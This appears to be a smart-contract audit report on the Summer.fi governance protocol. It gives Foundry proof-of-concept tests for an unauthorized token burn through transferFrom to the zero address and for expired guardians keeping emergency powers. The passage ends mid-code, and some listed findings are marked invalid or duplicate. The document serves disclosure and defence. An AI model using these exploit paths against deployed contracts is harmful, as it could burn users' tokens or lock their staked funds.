# 2025 09 summer fi governance v2 chainshieldai/summer earn protocol - Findings Report
## Commit hash: 19703a7179a349b357f85b37b16307634b17f151

##Findings by Pattern


 **Derived From** : totalSupply() == sum(Transfer events where from == address(0)).amount - sum(Transfer events where to == address(0)).amount

[M-1]. transferFrom(to=address(0)) bypasses burnFrom authorization; any approved spender can burn victim xSUMR and lock unstake - *VALID MEDIUM*



 **Derived From** : Guardian expiry not enforced in access modifiers (expired guardians keep privileges)

[M-2]. Expired guardians bypass authorization via ProtocolAccessManaged.onlyGuardian/onlyGuardianOrGovernor and can pause xSUMR post-expiry - DUP
[M-3]. Expired guardians can bypass authorization in ProtocolAccessManaged.onlyGuardian/onlyGuardianOrGovernor and still invoke emergency actions - *VALID MEDIUM*



 **Derived From** : Expired guardians can call onlyGuardian-protected functions (guardian expiry not enforced)

[M-4]. Expired guardians keep emergency powers due to ProtocolAccessManaged.onlyGuardian ignoring guardian expiration - DUP



 **Derived From** : If msg.sender != from, then hasRole(BURNER_ROLE, msg.sender) == true and allowance(from, msg.sender) decreases by amount; if msg.sender == from, burn() must be used for allowance-free self-burn

[M-5]. Unauthorized burn via transferFrom(to=0) bypasses burnFrom role checks in StakedSummerToken.burnFrom - DUP



 **Derived From** : When paused()==true, mint/burn/burnFrom revert and no Transfer is emitted; when unpaused, authorized calls succeed

[M-6]. Auth bypass: Any approved spender can burn users’ xSUMR via transferFrom(..., address(0)) bypassing BURNER_ROLE after unpause, locking users’ staked SUMR - DUP



 **Derived From** : Selector-only detection mislabels ops as guardian-expiry, blocking guardian cancel

[M-7]. Proposer can mislabel any operation as guardian-expiry via selector-only check, blocking guardian cancellation - INVALID
[M-8]. Proposer can mislabel any scheduled op as guardian-expiry via selector-only check in SummerTimelockController.schedule(), blocking guardian cancel - DUP



 **Derived From** : target == address(accessManager) && bytes4(data) == IProtocolAccessManager.setGuardianExpiration.selector => _isGuardianExpiryProposal(hashOperation(target, value, data, predecessor, salt))

[M-9]. Selector-only check misflags non-accessManager calls as guardian-expiry, blocking guardian cancellation - DUP



 **Derived From** : cancel() ‘governors only’ path still enforces Timelock CANCELLER_ROLE via super.cancel

[M-10]. Governors cannot cancel guardian-expiry ops unless also Timelock cancellers; proposer can flag ops to block intended cancellation - INVALID



 **Derived From** : Selector-only flag lets proposers block guardian cancellation for any operation

[M-11]. Proposers can bypass guardian cancellation by stuffing a dummy setGuardianExpiration selector in schedule/scheduleBatch - DUP



 **Derived From** : Expired guardians bypass onlyGuardianOrGovernor due to missing expiry check

[M-12]. Expired guardian can call onlyGuardianOrGovernor-gated functions (e.g., xSUMR pause/unpause) despite expiration  - DUP



 **Derived From** : Unstake forwards released tokens from escrow balance, causing DoS if wallet pays beneficiary

[M-13]. Permissionless release causes permanent DoS in SummerVestingWalletsEscrow._unstakeFromFactory by draining escrow accounting - *VALID MEDIUM*


### Number of Findings
- C: 0
- H: 0
- M: 13
- L: 0
- I: 0

##Findings by Pattern


 **Derived From** : totalSupply() == sum(Transfer events where from == address(0)).amount - sum(Transfer events where to == address(0)).amount

## [M-1]. transferFrom(to=address(0)) bypasses burnFrom authorization; any approved spender can burn victim xSUMR and lock unstake

## Derived From Pattern/Invariant
totalSupply() == sum(Transfer events where from == address(0)).amount - sum(Transfer events where to == address(0)).amount

## Exploit Type
AccountingInvariantViolation

## Location
StakedSummerToken._update

## Minimim Privilege Required
Permissionless

## Description
xSUMR aims to be non-transferable and restrict burning to token owner or BURNER_ROLE via burn/burnFrom. However, StakedSummerToken._update allows any movement where from==0 (mint) or to==0 (burn). Because ERC20.transferFrom routes through _update, an arbitrary spender with allowance can call transferFrom(user, address(0), amount) to burn the user’s tokens without holding BURNER_ROLE and without going through burnFrom’s _canBurnFrom check. This breaks the intended burn authorization and changes totalSupply through an unauthorized path, violating the stated invariant that attempted transfer/transferFrom should revert and not change supply. It also permanently removes the user’s xSUMR voting power and will prevent unstake flows that require burning the user’s xSUMR, effectively locking their underlying stake.

Vulnerable snippets:
- Authorization enforced only in burn/burnFrom, but not for transferFrom → burn path:
  function burnFrom(address from, uint256 amount) public override { if (!_canBurnFrom(from, msg.sender)) revert xSumr__NotAuthorized(); super.burnFrom(from, amount); }
- Transfer gating allows burns via transfer/transferFrom when to == address(0):
  function _canTransfer(address from, address to) internal pure returns (bool) { return from == address(0) || to == address(0); }
- _update only checks _canTransfer and then performs the state change:
  function _update(address from, address to, uint256 value) internal override { if (!_canTransfer(from, to)) revert xSumr_TransferNotAllowed(); super._update(from, to, value); }

## Impact
An approved third party can irreversibly burn a holder’s xSUMR by calling transferFrom(holder, address(0), amount), bypassing the intended BURNER_ROLE/owner-only authorization enforced in burnFrom. This strips the holder’s voting power and can block their ability to unstake SUMR (since unstake flows expect burning the holder’s xSUMR), effectively causing a denial-of-service that persists until governance intervenes to restore xSUMR via emergency minting. This is a relevant loss of rights and can lock funds operationally, but recovery by governor is possible, reducing the severity.

## Proof of Concept
1) Governor grants MINTER_ROLE to itself, mints xSUMR to a victim user.
2) Victim sets allowance (approve/permit) to a third-party spender (attacker) for convenience or phishing.
3) Attacker calls transferFrom(victim, address(0), amount), which is treated as a burn by _update because to == address(0).
4) No BURNER_ROLE is required, burnFrom’s authorization is bypassed, totalSupply decreases; victim loses xSUMR and cannot unstake underlying since unstake requires burning the same xSUMR.

## Proof of Code
pragma solidity 0.8.28;
import "forge-std/Test.sol";
import {StakedSummerToken} from "packages/gov-contracts/src/contracts/tokens/StakedSummerToken.sol";
import {IERC165} from "@openzeppelin/contracts/utils/introspection/IERC165.sol";

contract MockAccessManager is IERC165 {
    // Always claim to support the ProtocolAccessManager interfaceId
    function supportsInterface(bytes4) external pure returns (bool) { return true; }
    // Allow all role checks to pass for testing governor-only functions
    function hasRole(bytes32, address) external pure returns (bool) { return true; }
    // Satisfy ProtocolAccessManaged.onlyFoundation checks if ever called
    function FOUNDATION_ROLE() external pure returns (bytes32) { return bytes32(0); }
}

contract XSumrBurnBypassTest is Test {
    StakedSummerToken xsumr;
    address gov = address(this);
    address user = address(0xBEEF);
    address attacker = address(0xA11CE);

    function setUp() public {
        MockAccessManager pam = new MockAccessManager();
        xsumr = new StakedSummerToken(address(pam));
        // Make this test contract a minter (passes onlyGovernor via mock)
        xsumr.grantMinterRole(address(this));
        // Mint xSUMR to the user
        xsumr.mint(user, 100 ether);
        assertEq(xsumr.totalSupply(), 100 ether);
        assertEq(xsumr.balanceOf(user), 100 ether);
        // Sanity: attacker is not burner
        assertEq(xsumr.hasRole(xsumr.BURNER_ROLE(), attacker), false);
    }

    function test_AttackerBurnsViaTransferFromToZeroWithoutBurnerRole() public {
        // User grants allowance to attacker
        vm.prank(user);
        xsumr.approve(attacker, type(uint256).max);
        // Attacker burns user's tokens via transferFrom(to=address(0))
        vm.prank(attacker);
        xsumr.transferFrom(user, address(0), 100 ether);
        // Supply and balance reduced without BURNER_ROLE or burnFrom path
        assertEq(xsumr.balanceOf(user), 0);
        assertEq(xsumr.totalSupply(), 0);
    }
}


## Suggested Mitigation
Enforce burn authorization in the single movement hook. In StakedSummerToken._update, before calling super._update, add: if (to == address(0) && from != address(0)) require(msg.sender == from || hasRole(BURNER_ROLE, msg.sender), xSumr__NotAuthorized()); Do not attempt to re-implement allowance checks here; ERC20.transferFrom and ERC20Burnable.burnFrom already enforce allowance semantics. Alternatively, explicitly override transfer and transferFrom to revert unless (to == address(0) && (msg.sender == from || hasRole(BURNER_ROLE, msg.sender))). This ensures only the owner or authorized burners can trigger burns, closing the transferFrom-to-zero bypass.





 **Derived From** : Guardian expiry not enforced in access modifiers (expired guardians keep privileges)

## [M-2]. Expired guardians bypass authorization via ProtocolAccessManaged.onlyGuardian/onlyGuardianOrGovernor and can pause xSUMR post-expiry

## Derived From Pattern/Invariant
Guardian expiry not enforced in access modifiers (expired guardians keep privileges)

## Exploit Type
AccessControl

## Location
ProtocolAccessManaged.onlyGuardian / onlyGuardianOrGovernor (modifiers)

## Minimim Privilege Required
RequiresRole

## Description
ProtocolAccessManaged is intended to gate emergency actions to active guardians, but its modifiers only check raw role membership, ignoring guardian expiration tracked in ProtocolAccessManager. Vulnerable code:

modifier onlyGuardian() {
    if (!_accessManager.hasRole(GUARDIAN_ROLE, msg.sender)) {
        revert CallerIsNotGuardian(msg.sender);
    }
    _;
}

modifier onlyGuardianOrGovernor() {
    if (
        !_accessManager.hasRole(GUARDIAN_ROLE, msg.sender) &&
        !_accessManager.hasRole(GOVERNOR_ROLE, msg.sender)
    ) {
        revert CallerIsNotGuardianOrGovernor(msg.sender);
    }
    _;
}

ProtocolAccessManager exposes isActiveGuardian(account) which enforces both hasRole and guardianExpirations[account] > block.timestamp, but ProtocolAccessManaged never uses it. As a result, any address whose guardian expiration has passed but still retains GUARDIAN_ROLE can invoke functions in inheriting contracts that rely on onlyGuardian/onlyGuardianOrGovernor.

Example real impact path: StakedSummerToken.pause()/unpause() are guarded by onlyGuardianOrGovernor. An expired guardian can still pause xSUMR, disabling mint/burn. Since SummerStaking relies on xSUMR.burnFrom during unstake, users cannot unstake while paused, causing fund lock/DoS until governance intervenes. The docs state guardianship is temporary and only active guardians should have powers, but the code violates this.

## Impact
Expired guardians can continue to perform emergency actions after expiry across all inheriting contracts. Concrete example: pausing xSUMR blocks mint/burn and can lock staking withdrawals (burnFrom disabled when paused), causing protocol-wide DoS until unpaused. This breaks the invariant that only active (non-expired) guardians may exercise powers and enables indefinite disruption if governance relies on expiry rather than revocation.

## Proof of Concept
1) Attacker previously held GUARDIAN_ROLE. Governor schedules and executes setGuardianExpiration(attacker, now + 8 days) per policy, assuming guardian powers lapse after expiry.
2) After expiry passes (guardianExpirations[attacker] <= block.timestamp), attacker no longer qualifies as active guardian (isActiveGuardian == false), but still retains GUARDIAN_ROLE.
3) Attacker calls a guardian-gated emergency function in an inheriting contract that uses ProtocolAccessManaged.onlyGuardian or onlyGuardianOrGovernor.
4) Because the modifier checks only hasRole(GUARDIAN_ROLE, attacker) and ignores expiry, the call succeeds. For xSUMR.pause(), this halts mint/burn, making unstake flows revert and locking user funds. The attacker can re-pause repeatedly, causing prolonged DoS contrary to intended design.

## Proof of Code
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import {ProtocolAccessManager} from "packages/access-contracts/src/contracts/ProtocolAccessManager.sol";
import {ProtocolAccessManaged} from "packages/access-contracts/src/contracts/ProtocolAccessManaged.sol";

contract MockEmergency is ProtocolAccessManaged {
    bool public paused;

    constructor(address manager) ProtocolAccessManaged(manager) {}

    function emergencyPauseOnlyGuardian() external onlyGuardian {
        paused = true;
    }

    function emergencyPauseGuardianOrGovernor() external onlyGuardianOrGovernor {
        paused = true;
    }
}

contract GuardianExpiryBypassTest is Test {
    ProtocolAccessManager manager;
    MockEmergency target;
    address governor = address(0xA11CE);
    address guardian = address(0xB0B);

    function setUp() public {
        vm.warp(100);
        manager = new ProtocolAccessManager(governor);
        target = new MockEmergency(address(manager));

        // Grant guardian and set an 8-day expiry
        vm.prank(governor);
        manager.grantGuardianRole(guardian);
        vm.prank(governor);
        manager.setGuardianExpiration(guardian, block.timestamp + 8 days);
    }

    // Expired guardian still passes onlyGuardian due to missing expiry check
    function test_ExpiredGuardianBypasses_onlyGuardian() public {
        // Advance time past expiry
        vm.warp(block.timestamp + 9 days);

        // Sanity: no longer active
        assertTrue(!manager.isActiveGuardian(guardian));
        // But raw role still present
        assertTrue(manager.hasRole(manager.GUARDIAN_ROLE(), guardian));

        // Exploit: call onlyGuardian-gated function successfully
        vm.prank(guardian);
        target.emergencyPauseOnlyGuardian();
        assertTrue(target.paused());
    }

    // Expired guardian still passes onlyGuardianOrGovernor
    function test_ExpiredGuardianBypasses_onlyGuardianOrGovernor() public {
        vm.warp(block.timestamp + 9 days);
        vm.prank(guardian);
        target.emergencyPauseGuardianOrGovernor();
        assertTrue(target.paused());
    }
}


## Suggested Mitigation
Enforce guardian expiry in ProtocolAccessManaged modifiers by using isActiveGuardian:

- Replace onlyGuardian with:
  if (!_accessManager.isActiveGuardian(msg.sender)) revert CallerIsNotGuardian(msg.sender);

- Replace onlyGuardianOrGovernor with:
  if (!_accessManager.isActiveGuardian(msg.sender) && !_accessManager.hasRole(GOVERNOR_ROLE, msg.sender)) revert CallerIsNotGuardianOrGovernor(msg.sender);

Optionally add an internal helper (e.g., _isActiveGuardian) and update any other guardian checks in inheriting contracts to rely on this active status rather than raw role membership.


## [M-3]. Expired guardians can bypass authorization in ProtocolAccessManaged.onlyGuardian/onlyGuardianOrGovernor and still invoke emergency actions

## Derived From Pattern/Invariant
Guardian expiry not enforced in access modifiers (expired guardians keep privileges)

## Exploit Type
AuthByPass

## Location
ProtocolAccessManaged.onlyGuardian / onlyGuardianOrGovernor

## Minimim Privilege Required
RequiresRole

## Description
ProtocolAccessManaged gates emergency functions with onlyGuardian and onlyGuardianOrGovernor but checks only raw role membership and ignores guardian expirations tracked by ProtocolAccessManager. Vulnerable snippets:

modifier onlyGuardian() {
    if (!_accessManager.hasRole(GUARDIAN_ROLE, msg.sender)) {
        revert CallerIsNotGuardian(msg.sender);
    }
    _;
}

modifier onlyGuardianOrGovernor() {
    if (
        !_accessManager.hasRole(GUARDIAN_ROLE, msg.sender) &&
        !_accessManager.hasRole(GOVERNOR_ROLE, msg.sender)
    ) {
        revert CallerIsNotGuardianOrGovernor(msg.sender);
    }
    _;
}

ProtocolAccessManager exposes isActiveGuardian(account) enforcing both role and non-expired status:

function isActiveGuardian(address account) public view returns (bool) {
    return hasRole(GUARDIAN_ROLE, account) && guardianExpirations[account] > block.timestamp;
}

Docs state guardianship is temporary and only active guardians should exercise powers. However, expired guardians that still retain GUARDIAN_ROLE can call functions protected by onlyGuardian/onlyGuardianOrGovernor in inheriting contracts (e.g., pausing/unpausing tokens or emergency ops), violating the intended authorization boundary.

## Impact
Functional and monetary risk: expired guardians can pause critical contracts (e.g., xSUMR) causing DoS of mint/burn and locking unstake flows until governance intervenes; they can invoke other emergency actions in inheriting contracts, defeating the guardian-expiry safety control and breaking documented invariants.

## Proof of Concept
1) Governor grants GUARDIAN_ROLE to attacker and sets guardian expiration to now + 7 days. 2) Attacker uses guardian privileges legitimately before expiry. 3) After 7 days + 1 second (guardian expired per ProtocolAccessManager), attacker should be unauthorized. 4) Due to only checking hasRole, attacker still passes onlyGuardian/onlyGuardianOrGovernor and can pause/unpause or invoke other emergency functions post-expiry, causing DoS or unauthorized state changes.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import {ProtocolAccessManager} from "packages/access-contracts/src/contracts/ProtocolAccessManager.sol";
import {ProtocolAccessManaged} from "packages/access-contracts/src/contracts/ProtocolAccessManaged.sol";

contract MockVictim is ProtocolAccessManaged {
    bool public paused;

    constructor(address accessManager) ProtocolAccessManaged(accessManager) {}

    function pause() external onlyGuardianOrGovernor {
        paused = true;
    }

    function unpause() external onlyGuardianOrGovernor {
        paused = false;
    }
}

contract GuardianExpiryBypassTest is Test {
    ProtocolAccessManager pam;
    MockVictim victim;

    address governor = address(0xA11CE);
    address guardian = address(0xB0B);

    function setUp() public {
        vm.prank(address(0xDEAD)); // irrelevant deployer
        pam = new ProtocolAccessManager(governor);
        victim = new MockVictim(address(pam));

        // Grant GUARDIAN_ROLE and set expiration to now + 7 days (the minimum window)
        vm.startPrank(governor);
        pam.grantGuardianRole(guardian);
        pam.setGuardianExpiration(guardian, block.timestamp + 7 days);
        vm.stopPrank();

        // Sanity: guardian is active before expiry
        assertTrue(pam.isActiveGuardian(guardian));
    }

    function testExpiredGuardianStillAuthorizedDueToBug() public {
        // Guardian can pause while active
        vm.prank(guardian);
        victim.pause();
        assertTrue(victim.paused());

        // Advance time beyond expiry
        vm.warp(block.timestamp + 7 days + 1);
        assertFalse(pam.isActiveGuardian(guardian)); // expired per access manager

        // BUG: onlyGuardianOrGovernor checks only hasRole, not isActiveGuardian
        // Expired guardian can still unpause due to missing expiry check
        vm.prank(guardian);
        victim.unpause();
        assertTrue(!victim.paused());
    }
}


## Suggested Mitigation
Enforce guardian activity in modifiers. Replace raw GUARDIAN_ROLE membership checks with isActiveGuardian(account). For example:

modifier onlyGuardian() {
    if (!_accessManager.isActiveGuardian(msg.sender)) {
        revert CallerIsNotGuardian(msg.sender);
    }
    _;
}

modifier onlyGuardianOrGovernor() {
    if (
        !_accessManager.hasRole(GOVERNOR_ROLE, msg.sender) &&
        !_accessManager.isActiveGuardian(msg.sender)
    ) {
        revert CallerIsNotGuardianOrGovernor(msg.sender);
    }
    _;
}

This preserves existing governor powers and correctly revokes expired guardian authority.





 **Derived From** : Expired guardians can call onlyGuardian-protected functions (guardian expiry not enforced)

## [M-4]. Expired guardians keep emergency powers due to ProtocolAccessManaged.onlyGuardian ignoring guardian expiration

## Derived From Pattern/Invariant
Expired guardians can call onlyGuardian-protected functions (guardian expiry not enforced)

## Exploit Type
AccessControl

## Location
ProtocolAccessManaged.onlyGuardian

## Minimim Privilege Required
RequiresRole

## Description
ProtocolAccessManaged intends to gate emergency operations to active (non-expired) guardians, but the onlyGuardian (and onlyGuardianOrGovernor) modifiers check only hasRole(GUARDIAN_ROLE, msg.sender) instead of isActiveGuardian(msg.sender). As a result, any address that once received GUARDIAN_ROLE can continue invoking guardian-gated functions after their guardianExpirations[guardian] has elapsed. Vulnerable snippet:

modifier onlyGuardian() {
    if (!_accessManager.hasRole(GUARDIAN_ROLE, msg.sender)) {
        revert CallerIsNotGuardian(msg.sender);
    }
    _;
}

Impact: Any inheriting contract using onlyGuardian/onlyGuardianOrGovernor (e.g., emergency pause/unpause on xSUMR, configuration toggles, cancellations) is callable by an expired guardian, violating the time-bounded guardian model. This enables unauthorized pausing of governance token mint/burn flows (DoS of staking/unstaking) and other emergency controls beyond the intended expiry.

## Impact
Functional: expired guardians can still pause/unpause xSUMR and invoke other emergency-only operations in inheriting contracts, causing unauthorized DoS of staking/unstaking (mint/burn blocked) and governance safety violations past intended expiry.

## Proof of Concept
1) Governor grants GUARDIAN_ROLE to attacker and sets a valid expiration in ProtocolAccessManager.
2) Time advances beyond expiration; attacker is no longer an active guardian (isActiveGuardian(attacker) == false).
3) Attacker still calls a function protected by onlyGuardian in a child contract (e.g., emergency pause). Because onlyGuardian checks only hasRole, the call succeeds even though the guardian is expired.
4) Unauthorized pausing (or other emergency action) occurs beyond the guardian’s intended time window, breaking the guardian expiry invariant.

## Proof of Code
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import {ProtocolAccessManager} from "packages/access-contracts/src/contracts/ProtocolAccessManager.sol";
import {ProtocolAccessManaged} from "packages/access-contracts/src/contracts/ProtocolAccessManaged.sol";

contract GuardianGated is ProtocolAccessManaged {
    bool public halted;
    constructor(address accessManager) ProtocolAccessManaged(accessManager) {}
    function emergencyHalt() external onlyGuardian { halted = true; }
    function emergencyResume() external onlyGuardianOrGovernor { halted = false; }
}

contract ExpiredGuardianBypassTest is Test {
    ProtocolAccessManager internal accessManager;
    GuardianGated internal child;
    address internal governor = address(0xA11CE);
    address internal attacker = address(0xBEEF);

    function setUp() public {
        accessManager = new ProtocolAccessManager(governor);
        child = new GuardianGated(address(accessManager));
        vm.prank(governor);
        accessManager.grantGuardianRole(attacker);
        uint256 expiry = block.timestamp + 8 days; // within [7d, 180d]
        vm.prank(governor);
        accessManager.setGuardianExpiration(attacker, expiry);
    }

    function test_ExpiredGuardianCanStillCall_onlyGuardian() public {
        // Sanity: before expiry, attacker is active guardian
        assertTrue(accessManager.isActiveGuardian(attacker));

        // Fast-forward beyond expiry
        (uint256 expiration) = accessManager.getGuardianExpiration(attacker);
        vm.warp(expiration + 1);
        assertFalse(accessManager.isActiveGuardian(attacker));

        // Exploit: onlyGuardian uses hasRole (ignores expiry) -> call still succeeds
        vm.prank(attacker);
        child.emergencyHalt();
        assertEq(child.halted(), true, "expired guardian could still halt");

        // Also bypasses onlyGuardianOrGovernor because it checks hasRole as well
        vm.prank(attacker);
        child.emergencyResume();
        assertEq(child.halted(), false, "expired guardian could still resume");
    }
}


## Suggested Mitigation
Replace the role checks with active-guardian checks: in ProtocolAccessManaged, change onlyGuardian to require _accessManager.isActiveGuardian(msg.sender). For onlyGuardianOrGovernor, accept _accessManager.isActiveGuardian(msg.sender) || _accessManager.hasRole(GOVERNOR_ROLE, msg.sender). Optionally add an internal _isActiveGuardian helper for consistency. Add tests ensuring expired guardians cannot call guardian-gated functions.





 **Derived From** : If msg.sender != from, then hasRole(BURNER_ROLE, msg.sender) == true and allowance(from, msg.sender) decreases by amount; if msg.sender == from, burn() must be used for allowance-free self-burn

## [M-5]. Unauthorized burn via transferFrom(to=0) bypasses burnFrom role checks in StakedSummerToken.burnFrom

## Derived From Pattern/Invariant
If msg.sender != from, then hasRole(BURNER_ROLE, msg.sender) == true and allowance(from, msg.sender) decreases by amount; if msg.sender == from, burn() must be used for allowance-free self-burn

## Exploit Type
AuthByPass

## Location
StakedSummerToken.burnFrom

## Minimim Privilege Required
Permissionless

## Description
StakedSummerToken intends to restrict third-party burns to BURNER_ROLE (plus allowance) via burnFrom(), enforced by _canBurnFrom(from, spender). However, the ERC20 transferFrom path can burn by transferring to the zero address because _update() permits any transfer where to == address(0) or from == address(0):

function _canTransfer(address from, address to) internal pure returns (bool) {
    return from == address(0) || to == address(0);
}

Since ERC20 (OZ v5) treats transfer/transferFrom to address(0) as a burn, any spender with allowance can invoke transferFrom(from, address(0), amount) to burn someone else’s xSUMR without holding BURNER_ROLE. This bypasses the intended authorization of burnFrom(). Consequences:
- Any approved spender (or one with a signed permit) can destroy a user’s voting power (xSUMR).
- User may be unable to unstake in SummerStaking if required xSUMR was burned externally, potentially locking principal until governance intervention.

## Impact
Any spender with allowance (or a signed permit) can burn a holder’s xSUMR by calling transferFrom(from, address(0), amount), bypassing BURNER_ROLE checks in burnFrom(). This destroys governance voting power and can prevent users from unstaking underlying SUMR (since the staking module expects to burn xSUMR during unstake), effectively locking funds until governance intervention. This constitutes a denial-of-service on withdrawals rather than direct theft.

## Proof of Concept
Attack steps:
- Victim holds xSUMR and grants allowance (or signs a permit) to Attacker.
- Attacker does not have BURNER_ROLE.
- Attacker calls transferFrom(victim, address(0), amount) which routes through _update() and treats to == address(0) as a burn, succeeding without role checks.
- Show that burnFrom(victim, amount) reverts for the same attacker (no BURNER_ROLE), but transferFrom(victim, zero, amount) succeeds and reduces victim’s balance.

## Proof of Code
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Pausable.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Votes.sol";
import "@openzeppelin/contracts/utils/Nonces.sol";
import "@openzeppelin/contracts/utils/introspection/ERC165.sol";
import "@openzeppelin/contracts/utils/introspection/IERC165.sol";

interface IAccessControlErrors {
    error InvalidAccessManagerAddress(address addr);
    error CallerIsNotGovernor(address caller);
    error CallerIsNotKeeper(address caller);
    error CallerIsNotSuperKeeper(address caller);
    error CallerIsNotCurator(address caller);
    error CallerIsNotGuardian(address caller);
    error CallerIsNotGuardianOrGovernor(address caller);
    error CallerIsNotDecayController(address caller);
    error CallerIsNotFoundation(address caller);
}

enum ContractSpecificRoles { KEEPER_ROLE, CURATOR_ROLE }

interface IProtocolAccessManager is IERC165 {
    function hasRole(bytes32 role, address account) external view returns (bool);
    function FOUNDATION_ROLE() external view returns (bytes32);
}

// Minimal stub to satisfy ProtocolAccessManaged
contract ProtocolAccessManager is IProtocolAccessManager, ERC165 {
    bytes32 public constant GOVERNOR_ROLE = keccak256("GOVERNOR_ROLE");
    bytes32 private constant _FOUNDATION_ROLE = keccak256("FOUNDATION_ROLE");
    address public governor;
    constructor(address _gov) { governor = _gov; }
    function hasRole(bytes32 role, address account) external view returns (bool) {
        return role == GOVERNOR_ROLE && account == governor;
    }
    function FOUNDATION_ROLE() external view returns (bytes32) { return _FOUNDATION_ROLE; }
    function supportsInterface(bytes4 interfaceId) public view override returns (bool) {
        return interfaceId == type(IProtocolAccessManager).interfaceId || super.supportsInterface(interfaceId);
    }
}

contract ProtocolAccessManaged is IAccessControlErrors, Context {
    bytes32 public constant GOVERNOR_ROLE = keccak256("GOVERNOR_ROLE");
    bytes32 public constant SUPER_KEEPER_ROLE = keccak256("SUPER_KEEPER_ROLE");
    bytes32 public constant GUARDIAN_ROLE = keccak256("GUARDIAN_ROLE");
    bytes32 public constant DECAY_CONTROLLER_ROLE = keccak256("DECAY_CONTROLLER_ROLE");
    bytes32 public constant ADMIRALS_QUARTERS_ROLE = keccak256("ADMIRALS_QUARTERS_ROLE");

    ProtocolAccessManager internal immutable _accessManager;

    constructor(address accessManager) {
        if (accessManager == address(0)) revert InvalidAccessManagerAddress(address(0));
        if (!IERC165(accessManager).supportsInterface(type(IProtocolAccessManager).interfaceId)) {
            revert InvalidAccessManagerAddress(accessManager);
        }
        _accessManager = ProtocolAccessManager(accessManager);
    }

    modifier onlyGovernor() {
        if (!_accessManager.hasRole(GOVERNOR_ROLE, msg.sender)) revert CallerIsNotGovernor(msg.sender);
        _;
    }
    modifier onlyKeeper() {
        if (!_accessManager.hasRole(keccak256(abi.encodePacked(ContractSpecificRoles.KEEPER_ROLE, address(this))), msg.sender)
            && !_accessManager.hasRole(SUPER_KEEPER_ROLE, msg.sender)) {
            revert CallerIsNotKeeper(msg.sender);
        }
        _;
    }
    modifier onlySuperKeeper() {
        if (!_accessManager.hasRole(SUPER_KEEPER_ROLE, msg.sender)) revert CallerIsNotSuperKeeper(msg.sender);
        _;
    }
    modifier onlyCurator(address fleetAddress) {
        if (fleetAddress == address(0) ||
            !_accessManager.hasRole(keccak256(abi.encodePacked(ContractSpecificRoles.CURATOR_ROLE, fleetAddress)), msg.sender)) {
            revert CallerIsNotCurator(msg.sender);
        }
        _;
    }
    modifier onlyGuardian() {
        if (!_accessManager.hasRole(GUARDIAN_ROLE, msg.sender)) revert CallerIsNotGuardian(msg.sender);
        _;
    }
    modifier onlyGuardianOrGovernor() {
        if (!_accessManager.hasRole(GUARDIAN_ROLE, msg.sender) && !_accessManager.hasRole(GOVERNOR_ROLE, msg.sender)) {
            revert CallerIsNotGuardianOrGovernor(msg.sender);
        }
        _;
    }
    modifier onlyDecayController() {
        if (!_accessManager.hasRole(DECAY_CONTROLLER_ROLE, msg.sender)) revert CallerIsNotDecayController(msg.sender);
        _;
    }
    modifier onlyFoundation() {
        if (!_accessManager.hasRole(_accessManager.FOUNDATION_ROLE(), msg.sender)) revert CallerIsNotFoundation(msg.sender);
        _;
    }

    function hasAdmiralsQuartersRole(address account) public view returns (bool) {
        return _accessManager.hasRole(ADMIRALS_QUARTERS_ROLE, account);
    }
}

interface IStakedSummerToken is IERC20 {
    event StakingModuleAdded(address indexed stakingModule);
    event StakingModuleRemoved(address indexed stakingModule);
    error xSumr_InvalidStakingModule(string message);
    error xSumr__NotAuthorized();
    error xSumr_TransferNotAllowed();
    function addStakingModule(address _stakingModule) external;
    function removeStakingModule(address _stakingModule) external;
    function grantMinterRole(address _minter) external;
    function revokeMinterRole(address _minter) external;
    function pause() external;
    function unpause() external;
    function mint(address _to, uint256 _amount) external;
    function burn(uint256 _amount) external;
    function burnFrom(address _from, uint256 _amount) external;
}

contract StakedSummerToken is
    IStakedSummerToken,
    ERC20Burnable,
    ERC20Pausable,
    ProtocolAccessManaged,
    AccessControl,
    ERC20Permit,
    ERC20Votes
{
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
    bytes32 public constant BURNER_ROLE = keccak256("BURNER_ROLE");

    constructor(address _protocolAccessManager)
        ERC20("StakedSummerToken", "xSUMR")
        ERC20Permit("StakedSummerToken")
        ProtocolAccessManaged(_protocolAccessManager)
    {}

    function addStakingModule(address _stakingModule) external onlyGovernor {
        if (_stakingModule == address(0)) revert xSumr_InvalidStakingModule("Staking module address cannot be zero");
        _grantRole(MINTER_ROLE, _stakingModule);
        _grantRole(BURNER_ROLE, _stakingModule);
        emit StakingModuleAdded(_stakingModule);
    }

    function removeStakingModule(address _stakingModule) external onlyGovernor {
        _revokeRole(MINTER_ROLE, _stakingModule);
        _revokeRole(BURNER_ROLE, _stakingModule);
        emit StakingModuleRemoved(_stakingModule);
    }

    function pause() external onlyGuardianOrGovernor { _pause(); }
    function unpause() external onlyGuardianOrGovernor { _unpause(); }

    function mint(address to, uint256 amount) external onlyRole(MINTER_ROLE) { _mint(to, amount); }

    function burn(uint256 amount) public override(ERC20Burnable, IStakedSummerToken) { super.burn(amount); }

    function burnFrom(address from, uint256 amount) public override(ERC20Burnable, IStakedSummerToken) {
        if (!_canBurnFrom(from, msg.sender)) revert xSumr__NotAuthorized();
        super.burnFrom(from, amount);
    }

    function clock() public view override returns (uint48) { return uint48(block.timestamp); }
    function CLOCK_MODE() public pure override returns (string memory) { return "mode=timestamp"; }

    function _update(address from, address to, uint256 value)
        internal
        override(ERC20, ERC20Pausable, ERC20Votes)
    {
        if (!_canTransfer(from, to)) revert xSumr_TransferNotAllowed();
        super._update(from, to, value);
    }

    function nonces(address owner) public view override(ERC20Permit, Nonces) returns (uint256) {
        return super.nonces(owner);
    }

    function grantMinterRole(address _minter) external onlyGovernor { _grantRole(MINTER_ROLE, _minter); }
    function revokeMinterRole(address _minter) external onlyGovernor { _revokeRole(MINTER_ROLE, _minter); }

    function grantRole(bytes32, address) public view override { revert("DirectGrantIsDisabled"); }
